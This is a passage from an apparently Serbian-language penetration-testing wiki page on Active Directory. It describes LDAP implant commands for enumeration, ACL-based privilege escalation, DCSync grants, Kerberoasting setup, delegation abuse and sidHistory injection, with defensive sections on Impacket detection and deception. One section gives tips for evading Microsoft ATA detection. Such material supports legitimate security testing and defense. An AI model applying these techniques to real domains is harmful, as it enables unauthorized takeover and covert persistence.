### LDAP enumeracija sa strane implantata

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` i `get-groupmembers` razrešavaju kratka imena/OU putanje u pune DN-ove i ispisuju odgovarajuće objekte.
- `get-object`, `get-attribute` i `get-domaininfo` preuzimaju proizvoljne atribute (uključujući security descriptors), kao i metapodatke šume/domena iz `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` i `get-rbcd` prikazuju kandidate za roasting, podešavanja delegiranja i postojeće deskriptore [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) direktno iz LDAP-a.
- `get-acl` i `get-writable --detailed` parsiraju DACL i izlistavaju trustees, prava (GenericAll/WriteDACL/WriteOwner/upis atributa) i nasleđivanje, čime odmah otkrivaju ciljeve za eskalaciju privilegija putem ACL-a.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### LDAP primitive za upis za eskalaciju i perzistenciju

- BOF-ovi za kreiranje objekata (`add-user`, `add-computer`, `add-group`, `add-ou`) omogućavaju operatoru da pripremi nove principale ili mašinske naloge gde god postoje OU prava. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` direktno preuzimaju kontrolu nad ciljevima nakon pronalaženja prava za upisivanje svojstava.
- Komande usmerene na ACL, kao što su `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, pretvaraju WriteDACL/WriteOwner nad bilo kojim AD objektom u resetovanje lozinki, kontrolu članstva u grupama ili DCSync privilegije za replikaciju, bez ostavljanja PowerShell/ADSI tragova. Ekvivalentne komande `remove-*` uklanjaju ubačene ACE-ove.

### Delegiranje, roastovanje i zloupotreba Kerberos-a

- `add-spn`/`set-spn` odmah omogućavaju Kerberoasting nad kompromitovanim korisnikom; `add-asreproastable` (UAC toggle) označava ga za AS-REP roasting bez menjanja lozinke.
- Makroi za delegiranje (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) menjaju `msDS-AllowedToDelegateTo`, UAC zastavice ili `msDS-AllowedToActOnBehalfOfOtherIdentity` iz beacon-a, omogućavajući putanje napada sa ograničenim/neograničenim delegiranjem/RBCD i uklanjajući potrebu za udaljenim PowerShell-om ili RSAT-om.

### Ubacivanje sidHistory, premeštanje OU objekata i oblikovanje površine napada

- `add-sidhistory` ubacuje privilegovane SID-ove u SID history kontrolisanog principala (pogledajte [SID-History Injection](sid-history-injection.md)), omogućavajući prikriveno nasleđivanje pristupa u potpunosti preko LDAP/LDAPS-a.
- `move-object` menja DN/OU računara ili korisnika, omogućavajući napadaču da premesti imovinu u OU-ove u kojima već postoje delegirana prava, pre zloupotrebe komandi `set-password`, `add-groupmember` ili `add-spn`.
- Komande za uklanjanje sa usko definisanim opsegom (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itd.) omogućavaju brzo vraćanje promena nakon što operator prikupi akreditive ili uspostavi perzistenciju, uz smanjenje telemetrije.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Neke opšte odbrane

[**Saznajte više o zaštiti akreditiva ovde.**](../stealing-credentials/credentials-protections.md)

### **Odbrambene mere za zaštitu akreditiva**

- **Ograničenja za Domain Admins**: Preporučuje se da Domain Admins mogu da se prijavljuju samo na Domain Controllers, kako bi se izbegla njihova upotreba na drugim hostovima.
- **Privilegije servisnih naloga**: Servisi ne bi trebalo da se pokreću sa privilegijama Domain Admin (DA) radi očuvanja bezbednosti.
- **Vremensko ograničavanje privilegija**: Trajanje zadataka koji zahtevaju DA privilegije treba ograničiti. To se može postići ovako: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Ublažavanje LDAP relay napada**: Revidirajte Event ID-ove 2889/3074/3075, a zatim nametnite LDAP signing i LDAPS channel binding na DC-ovima/klijentima da biste blokirali LDAP MITM/relay pokušaje.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Otkrivanje Impacket aktivnosti na nivou protokola

Ako želite da otkrijete uobičajene AD tehnike, **nemojte se oslanjati samo na tragove koje kontroliše operator**, kao što su preimenovani binarni fajlovi, nazivi servisa, privremeni batch fajlovi ili izlazne putanje. Napravite osnovni profil načina na koji legitimni Windows klijenti generišu [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC i WMI saobraćaj, a zatim tražite **specifičnosti implementacije** koje ostaju čak i nakon što operator izmeni `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ili `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Kandidati sa visokom pouzdanošću za samostalno otkrivanje** (nakon provere u odnosu na sopstveni osnovni profil):
  - Autentifikovani DCE/RPC koji koristi `auth_context_id = 79231 + ctx_id`
  - DCE/RPC padding za autentifikaciju popunjen vrednošću `0xff`
  - LDAP Kerberos bind-ovi koji postavljaju sirovi Kerberos `AP-REQ` direktno u SPNEGO `mechToken`
  - SMB2/3 zahtevi za pregovaranje sa ASCII vrednostima `ClientGuid`
  - WMI `IWbemLevel1Login::NTLMLogin` koji koristi nestandardni namespace `//./root/cimv2`
  - Ukodirane Kerberos nonce vrednosti
- **Pogodnije kao funkcije za korelaciju/bodovanje**:
  - Retke ili duplirane Kerberos etype liste, neuobičajen/nedostajući `PA-DATA` ili redosled etype-ova u TGS-REQ-u koji odstupa od izvornog Windows ponašanja
  - NTLM Type 1 poruke bez informacija o verziji ili Type 3 poruke sa null imenima hostova
  - Sirovi NTLMSSP prenet preko DCE/RPC-a umesto SPNEGO-a, nedostajući DCE/RPC verifikacioni trailers ili nepodudaranje SPNEGO/Kerberos OID-ova
  - Više ovih osobina sa istog hosta/korisnika/sesije/vremenskog perioda predstavljaju mnogo jači signal nego bilo koje pojedinačno slabo polje
- **Koristite za obogaćivanje, a ne kao samostalna upozorenja**:
  - Podrazumevani nazivi fajlova, izlazne putanje, nasumični nazivi servisa, nazivi privremenih batch fajlova, podrazumevani nazivi računara i HTTP/WebDAV/RDP/MSSQL stringovi specifični za alat
  - Operatori ih lako menjaju; najbolje ih je koristiti za objašnjenje zašto je klaster koji obuhvata više protokola sumnjiv
- **Operativne napomene**:
  - Neki od ovih signala zahtevaju dešifrovan saobraćaj, [PCAP/Zeek parsiranje](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ili uvid sa strane servisa
  - Pre nego što ih pretvorite u upozorenja, proverite ih u odnosu na Samba/Linux klijente, uređaje i zastareli softver
  - Kako budete sticali poverenje u osnovni profil, unapređujte detekcije od obogaćivanja -> lova na pretnje -> upozoravanja

### **Primena tehnika obmane**

- Primena obmane podrazumeva postavljanje zamki, kao što su lažni korisnici ili računari, sa osobinama poput lozinki koje ne ističu ili oznake Trusted for Delegation. Detaljan pristup obuhvata kreiranje korisnika sa određenim pravima ili njihovo dodavanje u grupe sa visokim privilegijama.<sup>[[2]](#references)</sup>
- Praktičan primer je upotreba alata kao što je: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Više informacija o primeni tehnika obmane potražite na [Deploy-Deception na GitHub-u](https://github.com/samratashok/Deploy-Deception).

### **Prepoznavanje obmane**

- **Za korisničke objekte**: Sumnjivi indikatori obuhvataju neuobičajen ObjectSID, retke prijave, datume kreiranja i mali broj pogrešnih lozinki.
- **Opšti indikatori**: Poređenjem atributa potencijalnih lažnih objekata sa atributima pravih objekata mogu se otkriti nedoslednosti. Alati poput [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogu pomoći u prepoznavanju takvih obmana.

### **Zaobilaženje sistema za detekciju**

- **Zaobilaženje Microsoft ATA detekcije**:
  - **Enumeracija korisnika**: Izbegavanje enumeracije sesija na Domain Controllers da bi se sprečila ATA detekcija.
  - **Impersonacija tiketa**: Korišćenje **aes** ključeva za kreiranje tiketa pomaže u izbegavanju detekcije tako što se ne prelazi na NTLM.
  - **DCSync napadi**: Preporučuje se izvršavanje sa računara koji nije Domain Controller radi izbegavanja ATA detekcije, jer će direktno izvršavanje sa Domain Controller-a pokrenuti upozorenja.

## References

- [1] [Vodič za napade na poverenja između domena](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Kreiranje lažnih poverenja za obmanu u Active Directory-ju](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Od Domain Admin-a do Enterprise Admin-a](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – LDAP alat za eksploataciju Active Directory-ja u memoriji](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Upotreba NTLM hash-eva kao wordlist-e](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirati](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Analiza Impacket-a](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Preuzimanje kontrole nad Active Directory nalozima preko Netlogon-a](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Kako upravljati promenama Netlogon bezbednih kanalnih veza povezanih sa CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Putovanje kroz zaboravljene Null Session i MS-RPC interfejse](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter kao bezbednosna granica između domena? (Deo 4) - Istraživanje zaobilaženja SID filtering-a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter kao bezbednosna granica između domena? (Deo 5) - Golden GMSA trust napad - od child domena do parent domena](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter kao bezbednosna granica između domena? (Deo 6) - Schema change trust napad - od child domena do parent domena](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Od DA do EA pomoću ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Eskalacija od administratora child domena do enterprise administratora za 5 minuta zloupotrebom AD CS-a: nastavak](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Skriveni adut: osmišljavanje Active Directory DACL backdoor-a](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Izvorni kod NetExec pre2k modula](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - atribut msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
